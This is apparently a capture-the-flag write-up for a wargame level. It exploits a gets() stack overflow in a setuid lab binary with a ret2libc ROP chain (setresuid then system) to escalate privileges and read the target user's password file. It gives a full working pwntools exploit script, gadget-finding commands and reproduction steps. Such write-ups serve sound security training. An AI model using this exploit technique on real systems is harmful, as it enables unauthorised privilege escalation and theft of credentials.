# Rainfall — level03 (`armitage`) — Writeup

## Target

```
-rwsr-x--- 1 flag03 level03 16512 Jun  9 23:13 armitage
```

- Setuid binary, owned by `flag03`, executable by `level03`
- `x86-64`, dynamically linked, not stripped
- Goal: escalate from `level03` to `flag03`

### Protections (`checksec`)

```
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled (compiled-in marker only — not enforced on this CPU)
IBT:        Enabled (compiled-in marker only — not enforced on this CPU)
```

Also confirmed on the host:
```
randomize_va_space = 0   → ASLR disabled
```

This combination — **no canary, NX on, no PIE, no ASLR** — is the classic setup for a
**ret2libc / ROP** exploit: you can't run injected shellcode (NX), but you don't need to
leak anything (no ASLR, no PIE), and you can overwrite the return address cleanly
(no canary).

---

## The vulnerability

`queue_job()` reads user input with `gets()` into a fixed 128-byte stack buffer:

```c
static void queue_job(void)
{
    char msg[MSG_SIZE];   // 128 bytes
    ...
    gets(msg);            // <-- no bounds checking at all

    if (!validate_job(msg)) {
        ...
        return;
    }

    strncpy(job_queue[job_count].payload, msg + 4, MSG_SIZE - 1);
    ...
}
```

`gets()` never checks the size of its destination buffer, so any input longer than
128 bytes overflows into the saved `%rbp` and then the saved return address on the
stack. Critically, **the overflow happens before `validate_job()` is even called** —
so the return address is already clobbered regardless of whether the input "looks
valid."

### Stack layout (from `disas queue_job`)

```
sub $0x80, %rsp          → frame is exactly 0x80 (128) bytes
lea -0x80(%rbp), %rax    → msg starts at rbp-0x80
```

```
[ msg[0] .. msg[127] ]   128 bytes   (rbp-0x80 .. rbp-0x1)
[ saved rbp ]            8 bytes     (rbp+0)
[ return address ]       8 bytes     (rbp+8)
```

**Offset to the return address: 128 + 8 = 136 bytes.**

There's also a secondary useful primitive: `validate_job()` requires the input to
start with `"JOB"`, after which `strncpy()` copies `msg + 4` onward into
`job_queue[0].payload` — a **fixed, non-ASLR, non-PIE address in `.bss`**
(`0x40408C` in this build). This gives us a reliable place to stash a string
without depending on any stack address.

---

## Why a plain `system("/bin/sh")` ret2libc is not enough

The binary is setuid to `flag03`. When it runs:

```
Uid:  1004 (real)   1020 (effective)   1020 (saved)
```

`system()` in glibc always executes:

```c
execve("/bin/sh", ["/bin/sh", "-c", cmd], environ);
```

That `/bin/sh` is launched **without `-p`**. Any POSIX-compliant shell (bash, dash)
checks `ruid != euid` at startup and, without `-p`, immediately drops the effective
UID back down to match the real UID — **before your command even runs**. This means:

- A plain `system("/bin/sh")` chain executes fine, but the resulting shell is
  always `level03`, never `flag03` — no matter what's in the command string.
- `setuid(uid)` from an unprivileged setuid process can only change the
  **effective** UID, not the real UID — so calling it here is a no-op, since the
  effective UID is already `flag03`.
- The fix is **`setresuid(uid, uid, uid)`**, which *can* set the real UID too,
  as long as the target value matches the process's current real, effective, or
  **saved** UID (POSIX rule). Since the saved UID here is already `1020`
  (`flag03`), `setresuid(1020, 1020, 1020)` is legal and sets real = effective =
  saved = `1020`. After that, there is no `ruid != euid` mismatch left for any
  shell to drop, so a subsequent `system()` call stays privileged.

---

## Gadgets and addresses used

All libc addresses are computed as `libc_base + offset`, since ASLR is off the
same base is stable across runs. Find the base with:

```bash
ldd ./armitage
```

Gadgets found with `ROPgadget` against the target's libc, and functions resolved
with `nm -D`:

```bash
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "pop rdi"
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": pop rdx"
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "ret" | head
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -w "setresuid\|system\|exit$"
```

Used in the final chain:

| Purpose                                                        | Gadget / symbol |
|------------------------------------------------------------------|------------------|
| alignment nudge (SSE requires 16-byte stack alignment for `system`/`call`) | `ret` |
| arg 1 register                                                  | `pop rdi ; ret` |
| arg 2 / arg 3 register (no clean `pop rdx` existed)              | `pop rdx ; xor eax,eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret` |
| `pop rsi` variant available in this libc                         | `pop rsi ; pop r15 ; ret` |
| raise real/effective/saved UID to `flag03`'s UID                 | `setresuid()` |
| spawn a shell/command (now privileged, since ruid==euid)          | `system()` |
| clean exit afterward                                             | `exit()` |

**Important gotcha:** `gets()` stops reading at the first `0x0a` (newline) byte.
Any gadget or data address that happens to contain `0x0a` in any byte position
will silently truncate the payload. Always check each 8-byte little-endian
address for a `0x0a` byte before using it.

---

## Exploit script

```python
from pwn import *

context.arch = 'amd64'

libc_base = 0x7ffff7c00000   # from ldd ./armitage (fixed, ASLR off)

ret_gadget  = libc_base + 0x2882f     # ret
pop_rdi     = libc_base + 0x10f78b    # pop rdi ; ret
pop_rsi_r15 = libc_base + 0x10f789    # pop rsi ; pop r15 ; ret
rdx_gadget  = libc_base + 0xb505c     # pop rdx ; xor eax,eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
setresuid   = libc_base + 0x10ea00
system      = libc_base + 0x58750
exit_       = libc_base + 0x47ba0

cmd_bss    = 0x40408C   # job_queue[0].payload -- fixed .bss address, no ASLR/PIE dependency
flag03_uid = 1020       # `id flag03`

# "JOB:" satisfies validate_job(); strncpy() strips the prefix and copies
# the rest of our string into the fixed .bss address above.
msg = b"JOB:id > /tmp/id_result.txt\x00"
assert len(msg) < 136
payload = msg + b"A" * (136 - len(msg))   # pad to the return-address offset (136)

# Stage 1: setresuid(1020, 1020, 1020)
rop  = p64(ret_gadget)
rop += p64(pop_rdi)
rop += p64(flag03_uid)
rop += p64(pop_rsi_r15)
rop += p64(flag03_uid)
rop += p64(0)              # junk -> r15
rop += p64(rdx_gadget)
rop += p64(flag03_uid)     # -> rdx
rop += p64(0) * 4          # junk -> rbx, r12, r13, rbp
rop += p64(setresuid)

# Stage 2: system(cmd_bss)
rop += p64(ret_gadget)
rop += p64(ret_gadget)     # extra alignment nudge
rop += p64(pop_rdi)
rop += p64(cmd_bss)
rop += p64(system)
rop += p64(exit_)

payload += rop

p = process("./armitage")
p.recvuntil(b"Prove yourself: ")
p.sendline(payload)
print(p.recvall(timeout=2).decode(errors="replace"))
```

---

## Steps to reproduce

1. **Recon the binary**
   ```bash
   file armitage
   checksec armitage
   cat /proc/sys/kernel/randomize_va_space
   ```
   Confirms: no canary, NX on, no PIE, ASLR off.

2. **Find the vulnerable function and the offset**
   ```bash
   gdb ./armitage
   (gdb) disas queue_job
   ```
   Locate the `sub $0x.., %rsp` and the `lea` computing the buffer address to
   derive the offset to the return address (136 here).

3. **Resolve libc's base and needed symbols**
   ```bash
   ldd ./armitage
   nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -w "system\|exit$\|setresuid"
   ```

4. **Find usable gadgets**
   ```bash
   ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "pop rdi"
   ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": pop rdx"
   ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "ret" | head
   ```
   Reject any gadget whose address contains a `0x0a` byte.

5. **Find a fixed data address to stash a string** (avoids all the stack-address
   instability between `gdb`, `gdbserver`, and `process()`):
   ```bash
   objdump -d armitage | grep -A5 "<validate_job>:"
   ```
   Confirm `job_queue` lives in `.bss` at a fixed address and that
   `validate_job()` + the `"JOB:"` prefix lets you control its contents.

6. **Build and run the payload** (script above).

7. **Verify privilege escalation**
   ```bash
   python3 exploit.py
   cat /tmp/id_result.txt
   ```
   Expect: `uid=1020(flag03) ...`

8. **Grab the flag**, by changing one line and re-running:
   ```python
   msg = b"JOB:cat /home/flag03/.pass > /tmp/flag_result.txt\x00"
   ```
   ```bash
   python3 exploit.py
   cat /tmp/flag_result.txt
   ```

---

## Key lessons / pitfalls hit along the way

- **`gets()` truncates at `0x0a`.** Check every gadget/address for a stray
  newline byte before using it in a ROP chain.
- **`system()` cannot preserve privilege on a setuid binary.** It always execs
  an unprivileged `/bin/sh -c`, which drops euid on startup if `ruid != euid`.
  No command string can work around this.
- **`setuid()` vs `setresuid()`:** an unprivileged process can only move its
  *effective* UID with `setuid()`. Only `setresuid()` can also fix the *real*
  UID, and only to a value matching the current real/effective/saved UID.
- **Tracers defeat setuid.** The Linux kernel does not honor the setuid bit on
  an exec that is being traced (`gdb`, `gdbserver`, `strace`). Debugging under
  a tracer will *always* show the unprivileged behavior, even when the exploit
  works correctly when run untraced. Verify success only with a clean,
  untraced run.
- **Stack addresses are not stable across launch methods.** The same binary's
  local buffer can sit at a different address depending on whether it's run
  via `gdb`, `gdbserver`, or `pwntools.process()` — small differences in
  `argv[0]` length and environment variables shift the stack. Prefer a fixed
  `.bss`/`.data` address for payload strings instead of relying on `&buf`.
- **x86-64 stack alignment matters.** glibc internals (`system()`, `printf()`,
  etc.) can use SSE instructions that require the stack to be 16-byte aligned
  at the point of `call`. An extra bare `ret` gadget shifts alignment by 8
  bytes and commonly fixes an otherwise unexplained SIGSEGV deep inside a
  libc function.
